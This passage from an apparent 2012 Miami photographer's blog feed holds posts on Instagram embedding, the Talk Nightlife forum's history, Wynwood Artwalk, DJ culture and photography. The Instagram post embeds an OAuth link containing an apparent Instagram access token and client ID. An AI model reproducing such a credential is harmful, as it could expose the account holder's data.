<p>They&#8217;ll have to make sure it&#8217;s 140 characters or shorter so it fits in a tweet, I can tell you that much.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Instagram Embedding.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/11/instagram-embedding/"/>
    <updated>2012-09-11T11:59:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/11/instagram-embedding</id>
    <content type="html"><![CDATA[<p><a href='http://www.dan-vidal.com//blog/2012/09/11//' data-instagram-url='http://instagr.am/p/PbIV-nAgDn/' class='instagram-image'><img src='http://distilleryimage3.s3.amazonaws.com/9255154afbd411e1b2f422000a1e9a50_7.jpg' alt='Not quite a throwback but remember this @jacquejaxx ?' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/earlybird'>Earlybird</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.835243225,-80.182678222'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835243225,-80.182678222&markers=25.835243225,-80.182678222&zoom=14&size=612x200&sensor=false' alt='25.835243225,-80.182678222' /></a></p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73}&response_type=token&scope=likes+comments' id='277852496720953575_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p></p>

<p>Works in a way. I have to retrieve the media_id for each Instagram photo. It&#8217;s not implicit in the URL. Hi Jacque.</p>

<p>Hopefully this works.</p>

<p>Access token needed.</p>

<p>Tokens.</p>

<p>OK.</p>

<p>Stay tuned.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The free flow of opinion.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/10/the-free-flow-of-opinion/"/>
    <updated>2012-09-10T23:30:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/10/the-free-flow-of-opinion</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/keys-4655.jpg" width="960" height="640" title="'Above The Indian Key Channel Bridge - hey it is symbolic of the article'" ></p>

<p>For those of you who maybe only know me through this blog, I also am responsible for the operation of a little web forum called <a href="http://talknightlife.com/">Talk Nightlife</a>.</p>

<p>The reason I mention it in this context is because I actually picked up a few readers over the weekend based on my <a href="http://www.dan-vidal.com/blog/2012/09/08/wynwood-artwalk-too-hot-to-handle/">prior post about Artwalk</a>. A Twitter user called <a href="http://twitter.com/walkwynwood">WalkWynwood</a> must have had a Google Alert set up for Artwalk commentary, and kindly tweeted out my blog post on the good and bad of Artwalk. So, I picked up a few readers who only probably know me through this blog, and not the scandalous &#8220;TNL&#8221;.</p>

<p>TNL has actually been an outlet of mine for five years, as of next Monday. It is probably the only nightlife-related resource on the internet not nominally subject to the whims of advertisers.</p>

<!-- more -->


<p>As a little bit of a backgrounder, TNL was founded in September of 2007, by refugees from another nightlife website, the now-defunct Cooljunkie. In existence since 2000, &#8220;CJ&#8221; (we love our acronyms!) was an independent site about Miami and South Beach nightlife and culture, founded by two English expats and <a href="http://ryanalynporter.com">the guy who helped me put this blog up.</a> It was actually a blog before blogs were blogs. And there was a notoriously popular forum component. I was bought on in mid-2001 as an itinerant photographer/writer. Unpaid at first, though the sites founders, Nick and Sarah, actually promoted the hell out of me and got me work as my unofficial &#8220;agents&#8221;. It was a fair trade in my mind.</p>

<p>Unlike most web projects, there was a final payoff. In 2005, CJ was bought out by out-of-state rival Clubplanet, aka &#8220;CP&#8221;. Owned by the now-defunct Track Entertainment, CP was a national web forum about nightlife and clubs, with their focus city being New York. There were a few articles in there but no one really bothered to read them. Much like CJ, the popular part of CP was the community aspect. CP bought out CJ because CP wished to have a Miami presence, and and we at CJ kept stopping them. The Miami clubs (our advertisers) were very loyal to us. So, the old logic of &#8220;if you can&#8217;t beat &#8216;em, join &#8216;em&#8221;, kicked in. CP made us an offer we couldn&#8217;t refuse (payouts, equity in Track, and continued paid employment) and suddenly we found ourselves with corporate patronage.</p>

<p>Initially the operations continued as is, but with a budget. CJ was maintained as a business unit of it&#8217;s own, and we were free to keep doing business, as it were, but with funding. It seemed ideal.</p>

<p>However, reality soon reared it&#8217;s ugly head. CJ had a very active forum community component. Around Miami, it was feared by club owners, DJs, and promoters. Ugly secrets about nightlife routinely got out on the forums, much to the chagrin of the venues, some of which were advertisers. And even though you can&#8217;t un-ring a bell, we routinely censored or deleted posts that could cast our key advertisers in a bad light. Editorial and community definitely were not separate from advertising. And, we couldn&#8217;t maintain without these advertisers.</p>

<p>As time went on, eventually the corporate powers-that-be in New York wanted to take direct control over the Miami operations of CJ. That, and a few other things I&#8217;m not at liberty to mention (it went all the way to federal court at the end&#8230;), led to myself and the key players in CJ to depart the company, without being able to take CJ with us since it no longer was ours.</p>

<p>So, through a few machinations, we ended up under the corporate umbrella of one of the rivals to Track in the entertainment and media space. And thus, it was decided, with their patronage, to explicitly fund and found a website to counter the influence of CJ that we had built. Basically, we had to build something to destroy something else we built.</p>

<p>So, after a little thought, we realized that the most popular part of CJ was the forum, by a factor of four. People didn&#8217;t go for the articles or even my photos, it was the community part they liked. They liked to be able to post their thoughts, and read the thoughts of others. The more controversial, the better. So, with that in mind, Talk Nightlife was born in September of 2007.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/tnl.jpg" width="960" height="632" title="'TNL'" ></p>

<p>Initially, we had the goals, and the requirement from the powers-that-be above, to get some advertisers on board and pay for the investment made to bring the website to life. There was a forum component, a guide to local events, and my photo gallery. And our mission was to keep it as open as possible, since it&#8217;s what drew people to the site ultimately.</p>

<p>However, it did prove to be a very tricky, and ultimately unsuccessful balance. Advertisers simply weren&#8217;t interested in being on a site where, a few lines down, there were statements that weren&#8217;t necessarily supportive of them. The Opium Group, for example, would not place an ad, since they were regularly subject to criticism within the site. The whole &#8220;user-generated content&#8221; statement didn&#8217;t hold water with them, since it was expected that us site operators would put our bank accounts before our principles, like good Americans.</p>

<p>After awhile, TNL as a financial priority fell by the wayside. Other web projects financed by the investor in TNL started to bear massive fruit, and took a lot of the pressure off of TNL itself. The investor only really cared that we made money for the &#8220;department&#8221;, not that specific projects made money.</p>

<p>And besides, TNL was accomplishing one mission goal, to sink and destroy CJ, which it did admirably. CJ was rendered defunct, useless, and irrelevant to the discourse in nightlife. TNL slid into a parking orbit, and became the &#8220;drama magnet&#8221;, where it remains today, and is arguably the least-restricted source of nightclub news on the internet.</p>

<p>Now, without a steady source of income (there are advertisers but the ads are usually in-kind or severely discounted), how does the site exist? Well, the site itself costs next to nothing to run. Hosting is inconsequentially cheap, and the maintenance performed by myself and Ryan is negligible. The only screwups are on the side of the hosting service, and we just wait those out. And, the investors lost interest in the site long ago, so there it sits. TNL only really keeps ticking over through a fortuitous set of circumstances. Ryan and I only keep it running because it&#8217;s an interesting social experiment, and a distraction from our more mundane tasks. And I personally consider it a necessity in the nightlife industry, someone has to provide an unrestricted outlet.</p>

<p>Now, it&#8217;s not to say TNL is uncensored. It&#8217;s &#8220;self-censored&#8221;. Each and every user has the ability to edit their own posts if they choose. Clubs could, in theory, pressure users directly to edit their words, if it came down to it. Now, the interesting thing is, since the advent of Facebook and Twitter, clubs focus almost exclusively on those, leaving old-style forums like TNL off their radars. I suppose I should thank Facebook for taking the heat off of us.</p>

<p>However, the question on occasion does come up, are we interested in making money off of the site? The usual answer is no, since we know that if the site is &#8220;monetized&#8221;, eventually advertisers, even if they aren&#8217;t directly insulted, will object to being placed close to controversial content. While TNL is self-censoring, as I mentioned, most people choose not to censor themselves. Insults, defamation, and even outright hate speech happen on TNL. It&#8217;s the price of freedom I guess. I personally couldn&#8217;t see a well-known advertiser like Bacardi wanting to have an ad positioned near the postings of someone who regularly ridicules minorities. Yes, there&#8217;s someone on TNL who does that. We don&#8217;t censor him, the community does. But the posts still remain.</p>

<p>So, TNL essentially remains free because we&#8217;re choosing to not use it to make money.</p>

<p>Which begs the question, can a truly free source of information exist, and still make a profit? Or are truly free sources of information condemned to always operating at a loss, relying on the charity of others to merely exist?</p>

<p>With that in mind, I think we&#8217;re at a point now in the evolution of the internet, where this is actually less and less of a question. It does not cost much money to operate a site. This blog is a perfect example of it. It is hosted on <a href="http://heroku.com">Heroku</a> which is a platform-as-a-service provider. They provide the infrastructure, and I provide the application, which, in this case, is this blog. Heroku lives in the cloud and charges me for only what I use. This blog is currently so low-impact I have yet to incur a fee. I&#8217;m not privy to why Heroku does this, but it may be a remnant of the <a href="http://www.dan-vidal.com/blog/2012/08/22/how-it-was/">community spirit</a> which characterized the early days of the modern internet era, or it might just be too much damn trouble to monitor usage as such a fine-grained level, so it&#8217;s easier to let me squat here for free rather than charge me. And the actual pretty pictures are hosted over on <a href="http://s3.amazonaws.com/">Amazon S3</a>, which is another large-scale cloud effort, and my storage bill is less than a dollar so far. And, this blog is powered by <a href="http://octopress.org/">Octopress</a>, which is a free, open source blog platform. The breaks there are that there is no formal support or upgrade structure. The programmer of Octopress has no obligation to help me out.</p>

<p>In a nutshell, computing resources and storage are so cheap that maybe nowadays, uncensored and free channels of expression are easier to justify? Cheap hosting, cheap storage, and cheap or free publishing mechanisms. If TNL ever got the rug pulled out from under it, would it be as big of a disaster as some think? I used to think so. We went through the disaster once when we transitioned from CJ to TNL. It took awhile and a fair bit of investment to get the community to move over and to get everything pointed in the right direction. But that was 2007. Nowadays, a TNL-like service could be tossed up for a negligible investment, to the point one person could do it, without requiring a business plan or a way to make back the few dollars per year it costs to run.
Hm, maybe the community spirit is still around in a way. That&#8217;s something. Whether it&#8217;s about something inconsequential like nightlife, or something meaningful like politics, war, or social causes, truly free information outlets are necessary to a society that wants to call itself free. In my mind, the free flow of thought and ideas is more important than the balance sheet. Even though in today&#8217;s society it&#8217;s very difficult to put your ideals above your daily needs. Ideals don&#8217;t put food on the table all the time.</p>

<p>And yes, this was my non-angry blog post for today. I don&#8217;t think I got that worked up, did I? And happy fifth birthday Talk Nightlife. You&#8217;re my contentious little foster child. Also, if you&#8217;re of a mind and interested, we&#8217;re putting together a little shindig somewhere on the 28th of September. Keep checking <a href="http://forum.talknightlife.com/viewtopic.php?f=3&t=20004&st=0&sk=t&sd=a">this thread on TNL</a> for details. It&#8217;s not an official event since we don&#8217;t do official anything. Oh, and sign up if you want. Just mention you read about TNL on here and I&#8217;ll process the login right away.</p>

<p>Sidebar (because it is how I write on this blog): Certain details about TNL I&#8217;ve left intentionally vague. Why? Well, anyone with half a brain knows who was originally behind TNL and who put the money in. However, the general feeling at the time was that their involvement be minimized in public, and it was never discussed further as time went on. Those requests still remain in force from where I sit, even if the investing parties don&#8217;t remember or don&#8217;t care. I&#8217;m &#8220;having some class&#8221; with regards to that. I&#8217;m definitely grateful for their initial involvement though. I got to help raise a bastard child of a website. If I hear otherwise, I&#8217;ll let you know.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Wynwood Artwalk Too Hot To Handle?]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/08/wynwood-artwalk-too-hot-to-handle/"/>
    <updated>2012-09-08T23:16:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/08/wynwood-artwalk-too-hot-to-handle</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/artwalk.jpg" width="960" height="960" title="'Artwalk Wynwood Artwalk Miami'" ></p>

<p>Though I guess I could be considered part of the Miami art community, I almost never go to Artwalk in Wynwood. I&#8217;m usually busy Saturday nights, or I consider my rare downtime more valuable than bouncing from gallery to gallery, most of which probably wouldn&#8217;t exhibit anything I do. Photography is sort of underrepresented at Artwalk, but that&#8217;s for another rant.</p>

<p>So anyways, the rare times I go to it are last-minute call-ups like I did earlier tonight.</p>

<!-- more -->


<p>I got a text from my good friend <strong>Emi Guerra</strong>, he wanted to go out and cruise Artwalk and meet some of the Miami art community to tell them about his forthcoming <strong>UR1 Festival</strong>, the big music and art festival taking place on December 8th and 9th during Art Basel. The big announcement of the lineup is Monday, even though it has been leaked. So I won&#8217;t post it here since you can find it <a href="http://forum.talknightlife.com/">elsewhere.</a>.</p>

<p>But anyways, he wanted to go out and see the artists and art people. Makes sense if you are throwing an art-oriented festival. And, since I&#8217;m kinda in touch with these people (am I?) he invited me along.</p>

<p>So, I jumped into the 210 and zipped on down Biscayne to Wynwood.</p>

<p>Once I got to the area, what a bloody mission. Traffic was at a gridlocked standstill, and there were throngs of people out and about, to the point where Northwest 2nd Avenue was a pedestrian thoroughfare. I was supposed to meet Emi and his UR1 team at Wynwood Walls, and I ended up having to park about seven blocks away. I&#8217;m a healthy boy now so it&#8217;s no big deal, but it&#8217;s the principle. And I will not valet. The 210 isn&#8217;t an SLS or an E 63, but it&#8217;s my baby and no one except me and the crew at <a href="http://masterclassauto.com/">Masterclass Auto</a> touches the steering wheel.</p>

<p>Some have called for the major streets of Wynwood to be closed off to automotive traffic during Artwalk. 100 percent, yes. Please. Do this. Commissioner Sarnoff, it&#8217;s your district (for now), make it happen. The cops have their hands full pushing vehicular and pedestrian traffic around, and it&#8217;s a complete cluster down there, and it actually hampers the enjoyment of Artwalk.</p>

<p>So yes, Artwalk has truly exploded into a Miami social phenomenon. We officially have an art scene here as far as I&#8217;m concerned. Go us.</p>

<p>However, I finally did get situated, and met Emi, along with UR1&#8217;s Jackie Richie, Emi&#8217;s assistant Andrea, Alex Martinez of <a href="http://deepsleepstudio.com">Deepsleep</a>, and a few other scene people I know at Wynwood Walls, which was &#8220;at capacty&#8221; and had this weird dining area with a velvet rope and such set up.</p>

<p>They gotta update the artwork there. It&#8217;s been the same since I last went to Artwalk (oddly enough with Emi&#8217;s brother, Eddy) over two years ago. I&#8217;ll paint a wall. It won&#8217;t be anything &#8220;arty&#8221;, but it will be something from my mind. I&#8217;ll mention it here even.</p>

<p>As I mentioned earlier, everyone was out in force. Now, was everyone into the art? Hardly. Most people &#8220;Artwalking&#8221; couldn&#8217;t tell you if that was a piece by Nagelbett or Britto. They are out for the social experience. Emi phrased it best when he said, &#8220;They are out for something to do, and it&#8217;s cheap to go to Artwalk. Shit is expensive these days&#8230;&#8221;</p>

<p>He hit the nail on the head. Shit is expensive these days. Dinner for two will run you $100 or more. A night out at a club, even Space, will run you $100 per person (drinks, cover, and so on) or more if you VIP it. Having fun costs money!</p>

<p>But not at Artwalk. The galleries often have cash bars and/or free (albeit low-quality) booze on hand. They usually arrange a sponsorship or something. And the food trucks are out in force, and the food is cheap, though I wouldn&#8217;t necessarily trust it. Yeah, the modern food trucks have all the amenities, but it&#8217;s still a food truck, ya know? We called &#8216;em the &#8220;roach coaches&#8221; back in Jersey. Note to food truck owners, I&#8217;m not saying that your food truck has roaches. If you&#8217;re that concerned about what I said, you probably have something to hide. Be confident in your product and people talking shit, like me, won&#8217;t affect your business. Let freedom ring.</p>

<p>But yes, anyways, people are out for Artwalk because it&#8217;s cheap, interesting, and there&#8217;s a good social dynamic. And the galleries and artists put up with it since it will get their works exposed to the five percent of the people who actually know their art and are in a position to do something about it.</p>

<p>And yes, please block off the streets. Artwalk is now truly a &#8220;phenomenon&#8221; and it needs to be handled properly. Our art scene is finally getting some worldwide respect, and it&#8217;d be a shame if logistical squabbles killed off a major component of it.</p>

<p>Maybe I should run for the City Commission and make Artwalk one of my campaign platforms&#8230;</p>

<p>Dan Vidal For District 2 Commissioner!</p>

<p>Sidebar: Yes, I&#8217;m aware the issues mentioned here are old. But these first few articles on my blog are kind of for SEO purposes, as well as stuff that is on my mind, regardless of when it happened. It&#8217;s my blog, after all.</p>

<p>Sidebar 2: Yes, this devolved into a rant. In a nutshell, I did have fun at Artwalk. The food truck area is a great concept. Get &#8216;em all in one place. Also, good seeing the <a href="http://car2go.com/">Miami Car2Go</a> people out&#8230;thanks for the T-shirt guys.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[On the premise of exclusivity]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/06/on-the-premise-of-exclusivity/"/>
    <updated>2012-09-06T19:12:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/06/on-the-premise-of-exclusivity</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/ex.jpg" width="960" height="640" title="'MK II overlooking Space'" ></p>

<p>Over the years, a lot of people have been under the mistaken assumption that I&#8217;ve been the &#8220;exclusive&#8221; photographer for venues and events I&#8217;ve worked with.</p>

<p>I don&#8217;t enforce or expect exclusivity, and here&#8217;s why&#8230;</p>

<!-- more -->


<p>At the root of it all, I&#8217;m only one person. I can only be in so many places within a venue at once, especially if it&#8217;s a large scale venue such as Space. I&#8217;ll be upstairs on the Terrace, but the Loft might be uncovered, or the Ballroom. There isn&#8217;t money in the budget to clone me.</p>

<p>Also, the fact that photographers prior to me didn&#8217;t enforce exclusivity with their venue clients was an enormous boost to me being able to do what I do today. If they hadn&#8217;t left that door open, I might not have been as far along as I am today. However, back when I got started, the position/gig of &#8220;club photographer&#8221; was a rare one indeed. More on that in a minute.</p>

<p>And, if I were a large-scale venue manager/owner, and I had it in the budget, I would definitely want multiple photographic perspectives on what was going on that evening. Each and every person who picks up a camera has their own thoughts and ideas on how an image should come out, and it is a definite advertising boon to have those multiple perspectives represented. And in the case of email-harvesting sites posing as photo sites, the venue gets multiple sources of data. I don&#8217;t necessarily approve of the tactic, but it is what it is, and if I were a venue owner or manager, I would avail myself of a few of those sites.</p>

<p>Finally, to be honest, enforcing exclusivity and being &#8220;the guy&#8221; is a real <em>pain</em>. You&#8217;re expected to be everywhere at once, cover the event exactly in the style the client wants, which may not be your style, and the task of club photographer rapidly turns from a fun profession to a &#8220;job&#8221;, i.e. something you have to do to make money. And, frankly, I can think of many healthier activities that aren&#8217;t fun to do at all, that would earn me the same money or more that I do documenting the nightclub scene. I do it primarily because I love to do it, and the financial benefits are just the icing on the cake. You don&#8217;t see people clamoring to spend thousands of dollars on camera equipment just to take it into a smoke-filled room with loud music and sloppy drunk people because it&#8217;s a job.</p>

<p>However, the situation today could be regarded as a little different. Since I got started, the position of club photographer has gone from a rare job description, to one of almost ubiquity. Often, the last thing a party would consider is booking a photographer to document an event. It was usually a &#8220;6 PM on the night of the event&#8221; request, if they thought about it at all. Of course the internet changed that.</p>

<p>Now, if you throw a party at a club, it&#8217;s expected that you will have at least one or two guys on hand to document the event. However, some venues tend to go a little overboard, thinking any exposure is good, and let any guy with an SLR and an excuse into the venue. With the modern set of circumstances in mind, I&#8217;d at least require that the shooter have a full-fledged website (and not just a Facebook page or Flickr gallery) with which their images were to be posted. And, I&#8217;d probably cap the amount of shooters within a venue to a certain amount to avoid &#8220;shooting gallery&#8221; syndrome where there is, in fact, ten or more shooters in a venue. So, exclusivity on one person, not so much, but not overkill like some places are now. Especially if you add in everyone with their iPhones blazing away. But that&#8217;s for another rant.</p>

<p>If you&#8217;re in the club shooting world, keep shooting. Don&#8217;t expect or enforce exclusivity though, it&#8217;s not practical and definitely not in the spirit of things. There&#8217;s enough subject matter for all (well, most) of us.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The musical ecosystem.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/06/the-musical-ecosystem/"/>
    <updated>2012-09-06T02:24:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/06/the-musical-ecosystem</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/jive-4963.jpg" width="960" height="640" title="'Guy yelling at Adam'" ></p>

<p>I like shooting live concerts. There&#8217;s more than one guy or girl on stage, and there&#8217;s a lot of activity to document, from the vocalist to the instrumentalists, there&#8217;s always someone moving about and in action. Plus, the lighting can&#8217;t be argued with since the whole point of them being lit is to be seen. I actually like that almost every Tuesday I get to shoot Jive at Blue Martini Brickell.</p>

<!-- more -->


<p>It&#8217;s a singing contest of sorts, but it brings out some real talent. Whether they are there for fun or hoping for a big break, I don&#8217;t know, but it&#8217;s a fun event to shoot. The band, Higher Ground, is on point with their covers, so it gives the contestants a real thrill to have a genuine live band behind them. And the dynamics of shooting it are a welcome change from my usual club shooting.</p>

<p>Not that I mind the DJ-oriented shooting. It&#8217;s interesting, still after all these years, even with the proliferation of the DJ-as-rockstar during this current dance music bubble. Though some of these guys, it&#8217;s gone to their heads.</p>

<p>When I first started this, over a decade ago, DJs kind of knew where they fit in within the musical ecosystem. They were curators and purveyors of music. Even if they produced their own tracks, they were still sought after and regarded first and foremost, as musical librarians of a sort. You went to a specific DJ&#8217;s club night to hear new music since you trusted their musical taste was in line with yours. The end result was that you hopefully would go out to the record store the next day and purchase the tracks you heard. Even when the internet flipped the record store idea on it&#8217;s face, the hope was you&#8217;d go to your online record shop and do the same.</p>

<p>Then came the rockstar phenomenon. DJs demanded more and more salaries, for correspondingly less work. Even disregarding automation, most DJs are content to go from A to B and back again and ask for a $50,000 paycheck. I can remember when DJs would get paid a tenth of that, and do far more work behind the decks, even when the change from vinyl to CDs happened. And most of all, DJs knew where they fit in the scheme of things. They knew their job was to provide the soundtrack for a night out, not be the sole focus of a night out. They helped maintain the dynamic of providing great music to a party. Now, unfortunately, we&#8217;re in a sort of twilight zone where DJs get stage setups that rival those of genuine musicians, all to frame them pressing some keys on a Macbook. Now, some of the kids might argue that they&#8217;re &#8220;really doing something&#8221; up there, but the sad fact is, it&#8217;s all just sequencing and basic mixing. Very few DJs are actually doing anything innovative with the tools at hand. Though, those that are, ironically enough, are working the club scene and not about being the glory hogs of the world. You have veterans like Carl Cox who still throw down ten hour sets, working three or four inputs at once, and creating new compositions on the fly. And you have one of my favorites, the legendary Pete Tong, who generally eschews the festival scene, preferring to focus on his BBC show, and bringing the newest records and all the classics to the clubs. He knows he&#8217;s there to drive the dancefloor and show the party people a good time. One of the best sets I&#8217;ve heard recently was his WMC session at Space. He&#8217;ll actually be on the very same Terrace this coming weekend. I personally can&#8217;t wait, and I&#8217;m at the point know where I&#8217;m pretty jaded and it takes a lot to get me excited with regards to DJs.</p>

<p>Maybe that&#8217;s why I get a kick out of a little party like Jive. It&#8217;s a bunch of people having a good time and not taking everything so seriously. The cash prize ($200) isn&#8217;t going to solve world hunger or put a kid through college, so the people participating are usually just up there to have a good time. I think in the end if the rockstar DJs in the world remember that&#8217;s all people really want, we can get back to some sort of rationality in the dance club scene. It&#8217;s ironic, the live music scene in general (not just little singing contests in Brickell!) from what I can see is actually getting more down to earth, whereas DJs are getting more and more egotistical in their demands. Even Axl Rose in his prime would be envious of some of these guys&#8217; riders. But, from where I sit, I see it as a bubble. I&#8217;m confident the DJ world will get back to reality soon.</p>

<p>Oh and a disclaimer, I do sincerely appreciate what some DJs do on and off the decks. Those guys usually end up in my iPhone playlist. I&#8217;ll post it up someday. I think I do have an audio player plugin. Actually yeah I do. Note to self, start posting some sets of genuinely good DJs. But if any of you dear readers want a good place to start, just hunt out the sets of (in no particular order): Pete Tong, Victor Calderone, Roger Sanchez, The Martinez Brothers, Dennis Ferrer, Danny Tenaglia, Loco Dice, Marco Carola, Oscar G, Patrick M, Mark M (Miami), Trent Cantrelle, the Cocodrills, Louie Vega, Frankie Knuckles, and Eric Prydz to name a few.</p>

<p>I&#8217;ll try and kick up a favorite mix of mine in the next few days. I gotta see how it will affect my S3 bill. And also if there&#8217;s anything copyright-related I might have to worry about.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Sometimes you hit it.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/05/sometimes-you-hit-it/"/>
    <updated>2012-09-05T02:02:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/05/sometimes-you-hit-it</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/ldw-4518.jpg" width="960" height="640" title="'Jordyn at Space'" ></p>

<p>Sometimes you nail it, sometimes you don&#8217;t. You&#8217;re not always going to score the perfect shot each and every time.</p>

<p>I think a lot of people who pick up a camera get hung up on that. While yes, you try to capture the best image you can at a given moment, sometimes you have to work with what is there.</p>

<!-- more -->


<p>And sometimes that has to be enough.</p>

<p>Nightlife and concert photography straddles a line between photojournalism and staged photo performance. You can have as much control or as little control as you want in a lot of cases.</p>

<p>Take the image above for example. It is one of the quintessential elements of the modern nightclub, the dancer. Jordyn here is one of the regular girls at Space these days. Through a combination of knowing how my images come out, and being expertly lit by Space&#8217;s lighting designers, the image here straddles the line between a &#8220;spur of the moment&#8221; shot and a staged image. It is a spur-of-the-moment since I usually don&#8217;t request specific lighting cues for the dancers at Space. I could, since I maintain a good rapport with Dennis, Gabriel, and Mike, but they have their &#8220;canvas&#8221; to work their art on and I&#8217;d feel like I was interfering if I constantly requested specific lighting cues. Their goal is to light Jordyn in the most flattering way possible, and they succeed, so I leave it at that. When her or any of the other girls get up on the box, I know they will be lit well. So, it is staged, yes, but staged without the interference of me coordinating the lighting.</p>

<p>Now, on occasion, I will ask for specifics from the techs, of course. If I&#8217;m assigned to capture a specific image of a performer or DJ, then we will plan ahead. Staging the image gets me paid, and makes for a happy client. However, it&#8217;s certainly not photojournalism.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/ldw-4573.jpg" width="960" height="640" title="'Reboot aka Frank at Space'" ></p>

<p>My preference is to work with what is there, usually. I like to document the scene as it is. For example, the image of Reboot (Frank) above. What you see is what was actually happening. Frank was lining up his tracks for the next mix as the sun was rising over the Terrace at Space. No fancy lighting tricks, as a matter of fact, Gabriel had left to go to the bathroom and the lighting console was temporarily unmanned. Aesthetically, the image comes together, even though there may be some technical failings. Some may argue there&#8217;s a little too much noise in the image, or that the red light is a little too blotchy. However, the image was captured of one of the headliners of the morning doing his work on the decks, and the compelling nature comes from the overall composition of the image, with Frank being dominant, and the panopoly of gear adding to the atmosphere of the image, and of course, the teeming masses of people on the dancefloor below. A viewer would want to know more about what happened there, regardless of the noise or slight color issues. I documented what was there within the limits of my equipment, and I&#8217;d like to think I pulled it off. I didn&#8217;t use a flash to blow out the scene, nor did I call on one of the techs to light the booth just for me, even though I will do that on occasion. However, that wasn&#8217;t one of those occasions.</p>

<p>I worked with what I had on hand, and that was enough. At the end of the day, this presents the most accurate image of what a photographer sees. In an age of extensive photoshop work and manipulation, it&#8217;s the least any of us can do. Everyone has their own ideas and tastes about what to do in a club or concert situation, it just so happens mine is to work with what I have, and take it from there. Anything else, in my mind, is distorting reality, and I&#8217;d like to think I&#8217;m here to document reality through my vision. And sometimes the reality is that the situation is staged, and sometimes it isn&#8217;t. I think I&#8217;m safe in an ethical sense, since I&#8217;m documenting a staged situation, which usually isn&#8217;t staged for my benefit. They are pointing high-powered LED fixtures at Jordyn for the benefit of the audience, not myself. I just take advantage of the situation and fire away. While with Frank, he is not specifically lit to an ideal, but what I had to work with there was enough, as it had to be.</p>

<p>Work with what is there, and sometimes it has to be enough.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Keys Standard Time.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/03/keys-standard-time/"/>
    <updated>2012-09-03T13:28:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/03/keys-standard-time</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/keys-4648_blog.jpg" width="960" height="308" title="'Yellow Shark Channel'" ></p>

<p>I&#8217;ve always liked going down to the Keys, especially the Lower Keys and Key West.</p>

<p>It is one of the few places I&#8217;ve been to in the US where things are truly running at a different pace. No one&#8217;s concerned about their latest Facebook status, what Justin Bieber said on Twitter, or what their Klout score (a rigged and meaningless metric by the way) is.</p>

<!-- more -->


<p>It&#8217;s removed from the mainland as it were, by geography, but it&#8217;s not a pig-ignorant backwater of the Ozarks populated by people who are poised to vote for Romney this coming November. You can go to Key West, relax, but not feel like you are in a premillenial timewarp. They are connected down there, they just choose not to make a big deal of it. That&#8217;s actually the way I think they feel down there, &#8220;don&#8217;t make a big deal of it&#8221;.</p>

<p>After a fairly interesting morning of shooting photos of the Labor Day Weekend event at Space, featuring DJs AN21, Robert Dietz (a true master of his craft by the way), and Reboot (aka Frank&#8230;I always call DJs by their real names), I decided to call it off around 8 AM, get some rest, and actually go out and <em>produce</em> something photographically that day. I hadn&#8217;t generated much other than nightlife-related material over the preceding few weeks, so I figured I should get to it and find an interesting slice of land to document.</p>

<p>So, I figured why not head south? I&#8217;ve had good photo experiences there before, and I&#8217;ve always made mental notes on stopping points on the way down. So around 4 PM after some much-needed rest, I jumped in the 210 and headed to the Turnpike southbound.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/tipover.jpg" width="612" height="612" title="'Tip Over'" ></p>

<p>I like driving the Homestead Extension to the Florida Turnpike. It&#8217;s fairly new so the pavement hasn&#8217;t succumbed to the elements as of yet, and it&#8217;s never so congested that you are reduced to driving at a crawl. You can easily cruise at 85 MPH (keep your eyes open!) and not have to fuss with slowing down.</p>

<p>After a quick fill-up in Florida City ($4.29 a gallon for premium&#8230;), I got to the Overseas Highway proper.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/overseas.jpg" width="612" height="612" title="'Blaue'" ></p>

<p>Now, if you want to talk about minor driving frustrations, the Overseas Highway is it. One lane, with a few passing zones, and a lot of people have a nasty habit of going below the speed limit. I&#8217;m not a speed demon, but I do like to keep up a good pace, ya know?</p>

<p>Anyways, things were progressing swimmingly. And it being Labor Day weekend, the whole stretch of the Keys was abuzz with activity. People were out boating, barbecuing, RVing, and just having a grand old time.</p>

